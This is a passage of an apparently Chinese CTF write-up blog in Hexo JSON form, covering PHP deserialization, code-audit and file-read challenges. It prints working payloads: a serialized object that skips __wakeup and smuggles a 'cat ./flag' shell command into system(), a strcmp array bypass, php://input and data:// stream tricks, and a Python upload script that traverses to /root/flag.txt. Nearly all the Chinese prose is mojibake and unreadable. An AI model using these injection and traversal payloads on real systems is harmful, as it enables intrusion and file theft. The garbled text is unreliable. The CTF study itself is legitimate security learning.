die(&apos;&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;&apos;); &#125;&#125; =&gt; 12345elseif($pos===&quot;school&quot;)&#123; $pubg=$_GET[&apos;pubg&apos;]; $p = unserialize($pubg); // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);&#125; è¿™æ˜¯é€†ç€æ¨çš„é¡ºåºï¼Œæ„é€ çš„æ—¶å€™é¡ºç€æ¥å°±è¡Œ éœ€è¦æ­¦å™¨ä¸ºAWMï¼Œéœ€è¦ç»•è¿‡_wakeup()ï¼ŒCVE-2016-7124 âˆš $this-&gt;bagä¸ºGet_air_drops()ä¸­çš„$this-&gt;bï¼Œä¸º__call()ä¸­çš„$method ok,æœ€åç»•è¿‡ä¸‹é¢å³å¯ 123456789&gt; $file = explode(&quot;.&quot;,$method);&gt; echo $file[0];&gt; if(file_exists(&quot;.//class$file[0].php&quot;))&#123;&gt; system(&quot;php .//class//$method.php&quot;);&gt; &#125;&gt; else&#123;&gt; system(&quot;php .//class//win.php&quot;);&gt; &#125;&gt; æ ¹æ®elseå¯ä»¥æ„é€  $method=//win.php | cat ./flag ==&gt; system(â€œphp .//class//win.php | cat ./flag.phpâ€); payload: 1234$a = new sheldon();$a-&gt;weapon=&quot;AWM&quot;$a-&gt;bag=&quot;//win.php | cat ./class/flag&quot;echo serialize($a); å¾—åˆ° 1O:7:&quot;sheldon&quot;:3:&#123;s:2:&quot;bag&quot;;s:22:&quot;//win.php | cat ./flag&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125; ç»•è¿‡wakeup 1O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:22:&quot;//win.php | cat ./flag&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125; payloadï¼š ?LandIn=school&amp;pubg=O:7:â€sheldonâ€:3:{s:3:â€bagâ€;s:22:â€//win.php | cat ./flagâ€;s:6:â€weaponâ€;s:3:â€AWMâ€;} æœ‰ä¸ªå°å‘ï¼Œflagåœ¨æºä»£ç ä¸­ã€‚ ========================================================================== ctfè®ºå‰‘åœºindex.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?class Time&#123; public $flag = &quot;flag&#123;hahahha&#125;&quot;; public $truepassword = &quot;dasdasdsad&quot;; public $time; public $password ; public function __construct($tt, $pp) &#123; $this-&gt;time = $tt; $this-&gt;password = $pp; &#125; function __destruct()&#123; if(!empty($this-&gt;password)) &#123; if(strcmp($this-&gt;password,$this-&gt;truepassword)==0)&#123; echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;; if(!empty($this-&gt;time))&#123; if(!is_numeric($this-&gt;time))&#123; echo &apos;Sorry.&lt;br&gt;&apos;; show_source(__FILE__); &#125; else if($this-&gt;time &lt; 11 * 22 * 33 * 44 * 55 * 66)&#123; echo &apos;you need a bigger time.&lt;br&gt;&apos;; &#125; else if($this-&gt;time &gt; 66 * 55 * 44 * 33 * 23 * 11)&#123; echo &apos;you need a smaller time.&lt;br&gt;&apos;; &#125; else&#123; sleep((int)$this-&gt;time); var_dump($this-&gt;flag); &#125; echo &apos;&lt;hr&gt;&apos;; &#125; else&#123; echo &apos;&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;&apos;; &#125; &#125; else&#123; echo &apos;&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;&apos;; &#125; &#125; else&#123; echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;; &#125; &#125; function __wakeup()&#123; $this-&gt;password = 1; echo &apos;hello hacker,I have changed your password and time, rua!&apos;; &#125; &#125; if(isset($_GET[&apos;rua&apos;]))&#123; $rua = $_GET[&apos;rua&apos;]; @unserialize($rua); &#125; else&#123; echo &quot;&lt;h1&gt;Please don&apos;t stop rua 233333&lt;/h1&gt;&lt;br&gt;&quot;; &#125; è¿™é¢˜å…¶å®ç®—æ˜¯ä»£ç å®¡è®¡ï¼Œæ²¡æœ‰æ„é€ popé“¾å•¥çš„ 1ã€ç»•è¿‡wakeupçš„æ‰§è¡Œ(CVE-2016-7124):å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œï¼Œä¿®æ”¹å¯¹è±¡å±æ€§ä¸ªæ•°ã€‚ 12&gt;strcmp($this-&gt;password,$this-&gt;truepassword)==0&gt; 2ã€ç»•è¿‡strcmp: Php5.3ä¹‹åç‰ˆæœ¬ä½¿ç”¨strcmpæ¯”è¾ƒä¸€ä¸ªå­—ç¬¦ä¸²å’Œæ•°ç»„çš„è¯,å°†ä¸å†è¿”å›-1è€Œæ˜¯è¿”å›0ï¼Œæ„é€ passwordæ•°ç»„ 11 * 22 * 33 * 44 * 55 * 66=1275523920 66 * 55 * 44 * 33 * 23 * 11=1333502280 3ã€ç»•è¿‡sleep(): (1)ä½¿ç”¨16è¿›åˆ¶è¡¨ç¤º 0xå¼€å¤´ï¼Œå¼ºåˆ¶ç±»å‹è½¬åŒ–æ—¶ä¼šè½¬åŒ–ä¸º 0ï¼› (2)ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ 1.3E9 æ‰€ä»¥å¯ä»¥æ„é€  12$a = new Time(&apos;0x4d7c6d00&apos;,[1,2]);echo serialize($a).&quot;\\n&quot;; php5.4.45ä¸‹å®Œå…¨å¯ä»¥ php7.3.4 åŸæ¥æ˜¯wakeup()æ¼æ´å½±å“ç‰ˆæœ¬ï¼šPHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10&gt; å½“å¯¹è±¡æ ‡ç§°æˆå‘˜ä¸ªæ•°å¤šäºå®é™…æˆå‘˜ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡wakeup()æ–¹æ³•ï¼Œä½†æ˜¯ä»»ç„¶ä¼šæ‰§è¡Œ__destruct()æ–¹æ³•ã€‚ ========================================================================== DDCTF- ========================================================================== Xmanæ’ä½èµ›-1123&lt;?php include &quot;hello.php&quot;; include(unserialize($_GET[pass])); 123456789101112131415161718192021222324252627&lt;?php class Hello &#123; //file:///var/www/html/index.php //http://59.110.164.44 -o a.php //file:///etc/hosts //file:///var/log/ protected $a=&quot;file:///fla%67&quot;; function test() &#123; $b = strpos($this-&gt;a, &apos;flag&apos;); if($b) &#123; die(&quot;Bye!&quot;); &#125; $c = curl_init(); curl_setopt($c, CURLOPT_URL, $this-&gt;a); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5); echo curl_exec($c); &#125; function __destruct()&#123; $this-&gt;test(); &#125;&#125; $s = new Hello(); echo urlencode(serialize($s));?&gt; ç®€å•çš„urläºŒæ¬¡ç¼–ç ç»•è¿‡","categories":[],"tags":[{"name":"phpååºåˆ—åŒ–","slug":"phpååºåˆ—åŒ–","permalink":"http://yoursite.com/tags/phpååºåˆ—åŒ–/"},{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"2019ç½‘ç»œä¸å®‰å…¨ä¿¡æ¯ä¸“é¡¹èµ› web3-4","slug":"2019ç½‘ç»œä¸å®‰å…¨ä¿¡æ¯ä¸“é¡¹èµ›-web3-4","date":"2019-08-16T09:41:39.000Z","updated":"2019-08-22T13:47:49.629Z","comments":true,"path":"2019/08/16/2019ç½‘ç»œä¸å®‰å…¨ä¿¡æ¯ä¸“é¡¹èµ›-web3-4/","link":"","permalink":"http://yoursite.com/2019/08/16/2019ç½‘ç»œä¸å®‰å…¨ä¿¡æ¯ä¸“é¡¹èµ›-web3-4/","excerpt":"æ˜¨å¤©è·Ÿç€è¡¨å“¥ä»¥åŠç¦å»ºå†œå¤§çš„å¤§ä½¬ä»¬ä¸€èµ·åšäº†è¿™ä¸ªæ¯”èµ›ï¼Œæ€»ä½“æ¥è¯´é¢˜ç›®éš¾åº¦å·®è·æœ‰ç‚¹å¤§ï¼Œweb1ã€2è¿‡äºç®€å•ï¼Œweb3ã€4æœ‰ç‚¹éš¾ï¼Œä¸»è¦è¿˜æ˜¯è‡ªå·±å¤ªèœäº†ï¼Œä¸‹é¢è®°å½•ä¸‹web3ã€4 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"æ˜¨å¤©è·Ÿç€è¡¨å“¥ä»¥åŠç¦å»ºå†œå¤§çš„å¤§ä½¬ä»¬ä¸€èµ·åšäº†è¿™ä¸ªæ¯”èµ›ï¼Œæ€»ä½“æ¥è¯´é¢˜ç›®éš¾åº¦å·®è·æœ‰ç‚¹å¤§ï¼Œweb1ã€2è¿‡äºç®€å•ï¼Œweb3ã€4æœ‰ç‚¹éš¾ï¼Œä¸»è¦è¿˜æ˜¯è‡ªå·±å¤ªèœäº†ï¼Œä¸‹é¢è®°å½•ä¸‹web3ã€4 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; web2 æœ¬æ¥æ˜¯ä¸å†™web2çš„ï¼Œå†çœ‹äº†ChaMd5å®‰å…¨å›¢é˜Ÿçš„wpåï¼Œæœ‰ä¸ªå°trick ä»–ä»¬ç”¨xxeå°è¯•è¯»å–/proc/self/fd/2 ç”±æ­¤å¼•å‘äº†å¯¹/proc/selfå®¶æ—çš„å­¦ä¹  123456789&gt; /cmdline&gt; è¯¥æ–‡ä»¶ä¿å­˜äº†è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤è¡Œ&gt; /cwd&gt; ä¸€ä¸ªç¬¦å·è¿æ¥, æŒ‡å‘è¿›ç¨‹å½“å‰çš„å·¥ä½œç›®å½•&gt; /environ&gt; è¯¥æ–‡ä»¶ä¿å­˜è¿›ç¨‹çš„ç¯å¢ƒå˜é‡, å„é¡¹ä¹‹é—´ä»¥ç©ºå­—ç¬¦åˆ†éš”, ç»“å°¾ä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦. å› æ­¤, å¦‚æœè¦è¾“å‡ºè¿›ç¨‹ 1 çš„ç¯å¢ƒå˜é‡&gt; /fd&gt; è¿› ç¨‹æ‰€æ‰“å¼€çš„æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªç¬¦å·è¿æ¥åœ¨è¯¥å­ç›®å½•é‡Œ, ä»¥æ–‡ä»¶æè¿°ç¬¦å‘½å, è¿™ä¸ªåå­—å®é™…ä¸Šæ˜¯æŒ‡å‘çœŸæ­£çš„æ–‡ä»¶çš„ç¬¦å·è¿æ¥&gt; web3-show_me_your_imageç‚¹å¼€æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œç®€å•å°è¯•åå‘ç°äº‹æƒ…å¹¶ä¸ç®€å•ï¼Œæ²¡æœ‰ç»™å‡ºä¸Šä¼ åçš„è·¯å¾„ï¼Œåç¼€åå¯èƒ½æ˜¯ç™½åå•æ£€æµ‹ï¼Œå›åˆ°é¦–é¡µï¼Œå­˜åœ¨ä¸€ä¸ª 1&lt;img src=&quot;img.php?name=lZhRjmj%3D&quot;&gt; ä½†base64è§£ç é”™è¯¯ ç»§ç»­å°è¯•ï¼ŒæŠ“åŒ…å‘ç°ä¸Šä¼ æ–‡ä»¶æ—¶å­˜åœ¨set-cookie 1Set-Cookie: session=eyJmaWxlIjp7IiBiIjoiYkZwb1VtcHRhajA9In19.XVbnjA.EUBuniVR7NHnzkqINYGRdetAix0; 12345eyJmaWxlIjp7IiBiIjoiYkZwb1VtcHRhajA9In19==&gt; base64è§£ç bFpoUmptaj0===&gt; base64è§£ç lZhRjmj= çŒœæµ‹æ˜¯base64å˜å½¢ å¯ä»¥åŠæ‰‹æ’¸ï¼Œå¤§ä½¬ä»¬éƒ½æ˜¯çº¯æ‰‹æ’¸ï¼Œtql 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time : 2019/8/16 19:07# @Author : glotozz# @File : testbase64_table = [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;K&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;, &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;, &apos;+&apos;, &apos;/&apos;,&apos;=&apos;]base64_table2 = [0 for i in range(66)]def encode_b64(s): l = len(s) i = 0 result = &apos;&apos; while i &lt; l: # å°†å­—ç¬¦è½¬æ¢ä¸ºäºŒè¿›åˆ¶ç¼–ç ï¼Œç„¶åå¯¹é½ s1 = s[i] b1 = bin(ord(s1))[2:] cb1 = b1.rjust(8, &apos;0&apos;) i += 1 if i &gt;= l: cb2 = &apos;00000000&apos; else: s2 = s[i] b2 = bin(ord(s2))[2:] cb2 = b2.rjust(8, &apos;0&apos;) i += 1 if i &gt;= l: cb3 = &apos;00000000&apos; else: s3 = s[i] b3 = bin(ord(s3))[2:] cb3 = b3.rjust(8, &apos;0&apos;) # å°†ä¸‰å­—èŠ‚è½¬æ¢ä¸ºå››å­—èŠ‚ cb = cb1 + cb2 + cb3 rb1 = cb[:6] rb2 = cb[6:12] rb3 = cb[12:18] rb4 = cb[18:] # è½¬æ¢åçš„ç¼–ç è½¬ä¸ºåè¿›åˆ¶å¤‡ç”¨ ri1 = int(rb1, 2) ri2 = int(rb2, 2) ri3 = int(rb3, 2) ri4 = int(rb4, 2) # å¤„ç†æœ«å°¾ä¸ºï¼çš„æƒ…å†µï¼Œä»¥ï¼‡ï¼ï¼‡å¡«å…… if i - 1 &gt;= l and ri3 == 0: ri3 = -1 if i &gt;= l and ri4 == 0: ri4 = -1 result += base64_table[ri1] + base64_table[ri2] + base64_table[ri3] + base64_table[ri4] i += 1 return resulta = &quot;1.jpg&quot;t1 = encode_b64(a)t2 = &quot;lZhRjmj=&quot;#åªè¦ä½¿t2å°†65ä¸ªå­—ç¬¦éƒ½å‡ºç°ä¸€éå³å¯ï¼Œfor i in range(len(t1)): base64_table2[base64_table.index(t1[i])] = t2[i]print base64_table2 åˆšåˆšæ‰“ç®—å¼€å§‹æ’¸è¡¨ï¼Œç¯å¢ƒå…³é—­äº†ã€‚ã€‚ã€‚ğŸ˜­ åªèƒ½ç”¨éŸ©å¤§ä½¬æ‰‹æ’¸çš„è¡¨ 123base64_table = [&apos;/&apos;,&apos;d&apos;, &apos;3&apos;, &apos;y&apos;, &apos;i&apos;,&apos;N&apos;,&apos;m&apos;,&apos;o&apos;,&apos;7&apos;,&apos;C&apos;,&apos;a&apos;,&apos;l&apos;,&apos;D&apos;,&apos;w&apos;,&apos;2&apos;,&apos;q&apos;,&apos;W&apos;,&apos;Z&apos;,&apos;5&apos;,&apos;J&apos;,&apos;P&apos;,&apos;Y&apos;,&apos;L&apos;,&apos;0&apos;,&apos;M&apos;,&apos;T&apos;,&apos;A&apos;, &apos;j&apos;, &apos;S&apos;, &apos;6&apos;, &apos;e&apos;,&apos;f&apos;,&apos;x&apos;,&apos;k&apos;,&apos;9&apos;,&apos;V&apos;,&apos;X&apos;,&apos;g&apos;,&apos;v&apos;,&apos;s&apos;,&apos;R&apos;,&apos;u&apos;,&apos;F&apos;,&apos;+&apos;,&apos;8&apos;,&apos;p&apos;,&apos;H&apos;,&apos;4&apos;,&apos;B&apos;,&apos;1&apos;,&apos;r&apos;,&apos;O&apos;,&apos;U&apos;,&apos;b&apos;, &apos;h&apos;, &apos;K&apos;, &apos;t&apos;, &apos;n&apos;,&apos;=&apos;] ä½†æ˜¯æˆ‘åˆå‘ç°ä»–çš„è¡¨ä¸å®Œæ•´ï¼Œåªèƒ½åŒ¹é…ä¸Šä»–è‡ªå·±çš„è¡¨ã€‚ã€‚ 123old_base64_table = [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;,&apos;e&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;, &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;8&apos;,&apos;9&apos;,&apos;=&apos;] æ¯”å¦‚è®¿é—®../../etc/passwd 123456a = &quot;/etc/passwd&quot;res = &quot;&quot;t1 = encode_b64(a)for i in range(len(t1)): res += base64_table2[base64_table.index(t1[i])]print res ä½†æ˜¯æœ‰ä¸ªè·¯å¾„/proc/self/cwdä»£è¡¨æŒ‡å‘ç½‘ç«™æœåŠ¡çš„æ ¹ç›®å½•ï¼Œä½†æ˜¯ç”¨../../proc/self/cwd/index.phpå»è¯»å–index.phpï¼Œä¹Ÿå¤±è´¥äº† å°±çŒœæµ‹æ˜¯ä¸æ˜¯flaskç½‘ç«™ å°è¯•è¯»å–/proc/self/cwd/app.pyï¼Œè¯»å–åˆ°äº†æºä»£ç ï¼š ä¹‹ååŒ…å«æç¤ºæ–‡ä»¶å³å¯ ä¸»è¦æ˜¯3ç‚¹ï¼Œbase64å˜å½¢ï¼Œ/proc/self/cwdæ‰§è¡Œæ ¹ç›®å½•ï¼Œflaskæ¶æ„ï¼ˆapp.py) å†è¯´å¥é¢˜å¤–è¯ï¼Œæœ€åç»™çš„æç¤ºæ˜¯flagå†/root/flag.txtä¸­ å¯ä»¥æ•´ç†ä¸€ä¸ªå­—å…¸ï¼ŒæŠŠå¯ç–‘è·¯å¾„éƒ½åŠ è¿›å» 123456789101112&gt; /root/flag.txt&gt; /root/flag&gt; &gt; /flag.txt&gt; /flag&gt; &gt; /etc/flag.txt&gt; /etc/flag&gt; &gt; /proc/self/cwd/flag.txt&gt; /proc/self/cwd/flag&gt; åˆšåˆšæ˜Ÿç›Ÿå®‰å…¨ç»™å‡ºäº†wp base64 ç¼–ç è¡¨æ˜¯æ”¹è¿‡çš„ï¼Œæˆ‘ä»¬ä¸éœ€è¦æŠŠç¼–ç è¡¨è·‘å‡ºæ¥ï¼Œç›´æ¥æ„é€ æ–‡ä»¶åï¼Œè®©å®ƒå¸®æˆ‘ä»¬ç¼–ç ã€‚ ä½†æ˜¯åªå…è®¸ å›¾ç‰‡æ–‡ä»¶æ‰©å±•å ï¼Œæ‰€ä»¥å¿…é¡»æ˜¯ å›¾ç‰‡æ–‡ä»¶æ‰©å±•å ç»“å°¾ã€‚ è¿™é‡Œå¯ä»¥åˆ©ç”¨ base64 æ¯ 3å­—èŠ‚ ç¼–ç å¾—åˆ° 4å­—èŠ‚ çš„åˆ†ç»„ç‰¹æ€§ï¼Œä¸å« æ‰©å±•åéƒ¨åˆ† çš„æ–‡ä»¶è·¯å¾„ç”¨ / æ–œæ ç¬¦å¡«å……è‡³èƒ½è¢« 3 æ•´é™¤ï¼Œè®©æœ€å æ‰©å±•åéƒ¨åˆ† å§‹ç»ˆè½åœ¨ä¸€ä¸ªåˆ†ç»„çš„å¼€å¤´ï¼Œä½¿å¾—æ¯æ¬¡ç¼–ç ç»“æœç›¸ç­‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä¸¢å¼ƒäº†ã€‚ 1234567891011121314151617181920#coding=utf-8 import requestsimport urllibfrom base64 import * url=&apos;http://4d94492ab4fc4d0199f60b1f39d343e5805934980516472c.changame.ichunqiu.com/&apos; path=&apos;../..///root/flag.txt&apos;files=&#123;&apos;file&apos;:(path+&apos;...png&apos;,&apos;a&apos;)&#125;r=requests.post(url+&apos;upload.php&apos;,files=files)try: name=r.text.split(&apos;img.php?name=&apos;)[1].split(&apos;&quot;&apos;)[0]except: name=r.textname=urllib.unquote(name)[:-8]#print namer=requests.get(url+&apos;img.php?name=&apos;+urllib.quote(name))print r.text ========================================================================== web4-æŒ‰Fæ³¨å…¥ web4åˆ°æœ€åè¿˜æ˜¯é›¶è§£ hint:ä¸æ˜¯æ‰€æœ‰sqléƒ½å«PostgreSQL hint2: dns ç­‰ç½‘ä¸Šå‡ºç°wpäº†å†è®°å½•ä¸‹ å‚è€ƒé“¾æ¥ï¼šhttp://url.cn/55mnocA","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://yoursite.com/tags/wp/"}]},{"title":"å‡ é“ä»£ç å®¡è®¡é¢˜","slug":"å‡ é“ä»£ç å®¡è®¡é¢˜","date":"2019-08-16T04:25:40.000Z","updated":"2019-08-22T13:47:42.968Z","comments":true,"path":"2019/08/16/å‡ é“ä»£ç å®¡è®¡é¢˜/","link":"","permalink":"http://yoursite.com/2019/08/16/å‡ é“ä»£ç å®¡è®¡é¢˜/","excerpt":"ä»£ç å®¡è®¡ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"ä»£ç å®¡è®¡ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; HackingLabè„šæœ¬å…³äºŒ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php header(&quot;Content-type: text/html; charset=utf-8&quot;); if (isset($_GET[&apos;view-source&apos;])) &#123; show_source(__FILE__); exit(); &#125; include(&apos;flag.php&apos;); $smile = 1; if (!isset ($_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/\\./&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/%/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/[0-9]/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/http/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0; if (preg_match (&apos;/https/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0; if (preg_match (&apos;/ftp/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/telnet/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/_/&apos;, $_SERVER[&apos;QUERY_STRING&apos;])) $smile = 0; if ($smile) &#123; if (@file_exists ($_GET[&apos;^_^&apos;])) $smile = 0; &#125; if ($smile) &#123; $smile = @file_get_contents ($_GET[&apos;^_^&apos;]); if ($smile === &quot;(â—&apos;â—¡&apos;â—)&quot;) die($flag); &#125; ?&gt; &lt;!doctype html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;title&gt;Show me your smile :)&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;div class=&quot;loginform cf&quot;&gt; &lt;form name=&quot;login&quot; action=&quot;index.php&quot; method=&quot;POST&quot; accept-charset=&quot;utf-8&quot;&gt; &lt;ul&gt; &lt;li&gt; &lt;label for=&quot;SMILE&quot;&gt;è¯·ä½¿ç”¨å¾®ç¬‘è¿‡å…³&lt;a href=&quot;?view-source&quot;&gt;æºä»£ç &lt;/a&gt;&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;T_T&quot; placeholder=&quot;where is your smile&quot; required&gt; &lt;/li&gt; &lt;li&gt;&lt;input type=&quot;submit&quot; value=&quot;Show&quot;&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;div style=&quot;text-align:center;clear:both&quot;&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; file_get_contents()ï¼Œå¯ä»¥ç”¨çš„åè®®æœ‰ file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ http:// â€” è®¿é—® HTTP(s) ç½‘å€ ftp:// â€” è®¿é—® FTP(s) URLs php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ zlib:// â€” å‹ç¼©æµ data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰ glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ phar:// â€” PHP å½’æ¡£ ssh2:// â€” Secure Shell 2 rar:// â€” RAR ogg:// â€” éŸ³é¢‘æµ expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ ä½†æ˜¯æœ‰ä¸€äº›ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œå…¶ä¸­ç»•è¿‡ 1if (preg_match (&apos;/_/&apos;, $_SERVER[&apos;QUERY_STRING&apos;])) å½“.æˆ–[]ä¹‹ç±»çš„ç¬¦å·ä½œä¸ºå‚æ•°çš„keyçš„æ—¶å€™ï¼Œä¼šè¢«phpæ”¹å†™ä¸º_ ç¬¬ä¸€ç§æ–¹æ³•ï¼š ?^.^=php://input post:(â—â€™â—¡â€™â—) ç¬¬äºŒç§æ–¹æ³•: file_existså¯¹äºdataæ‰§è¡Œå†…å®¹çš„åˆ¤æ–­ä¸ºä¸å­˜åœ¨ ?^.^=data://text/plain;charset=unicode,%28%E2%97%8F%27%E2%97%A1%27%E2%97%8F%29 ======================================================================== è¿™æ˜¯ä¸å“¥å‡ºçš„ä¸€é“é¢˜ï¼ŒåŸé¢˜æœ‰å¥½å‡ æ­¥ï¼Œè¿™é‡Œåªè®°å½•æœ€åä¸€æ­¥ 1234567891011121314151617181920212223&lt;?phperror_reporting(0);if(count($_POST)&gt;0 || count($_GET)&gt;1)&#123; die(&quot;æ£€æµ‹åˆ°æœ¨é©¬,è¯·å‹¿æäº¤éæ³•å‚æ•°&quot;);&#125;class Server&#123; public $file=&apos;myserver.php&apos;; function get_file()&#123; include_once($this-&gt;file); &#125; function __toString() &#123; $this-&gt;get_file(); &#125;&#125;$file = unserialize($_GET[&apos;file&apos;]?:&apos;&apos;);echo $file; å‘ç‚¹åœ¨äº 123if(count($_POST)&gt;0 || count($_GET)&gt;1)&#123; die(&quot;æ£€æµ‹åˆ°æœ¨é©¬,è¯·å‹¿æäº¤éæ³•å‚æ•°&quot;);&#125; åŸé¢˜è¿˜å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯è¿™é‡Œä¸èƒ½ä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå› ä¸ºä½ ä¼šå‘ç°èœåˆ€è¿æ¥ä¸ä¸Šï¼Œå› ä¸ºå¯¹ä¼ å…¥çš„å‚æ•°ä¸ªæ•°åšäº†é™åˆ¶ï¼Œåªèƒ½æ¯æ¬¡ä¼ ä¸€ä¸ªæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ ä¸¾ä¸ªæ —å­ 1&lt;?php phpinfo();?&gt; ä»¥åæµ‹è¯•çš„æ—¶å€™å¯ä»¥å…ˆä¸ä¼ ä¸€å¥è¯ï¼Œå…ˆç”¨è¿™ç§ç›´æ¥å¯ä»¥æ‰§è¡Œçš„phpæ–‡ä»¶è¯•è¯•ï¼Œé˜²æ­¢å­˜åœ¨ç±»ä¼¼çš„wafğŸ˜€ï¼Œæƒ³ä¸å“¥äº† ========================================================================== jactfé‡Œé‡åˆ°çš„ä¸€é¢˜ 12345678910111213141516&lt;?php $str5 = (string)$_POST[&apos;str5&apos;]; $str6 = (string)$_POST[&apos;str6&apos;]; $str7 = (string)$_POST[&apos;str7&apos;]; if( $str5 == $str6 || $str6 == $str7 || $str5 == $str7)&#123; echo &quot;sorry1&quot;; &#125; else if(md5($str5) !== md5($str6) || md5($str5) !== md5($str7) || md5($str6) !== md5($str7))&#123; echo &quot;sorry2&quot;; &#125; else&#123; echo &quot;flag&#123;xxxxxxxx&#125;&quot;; 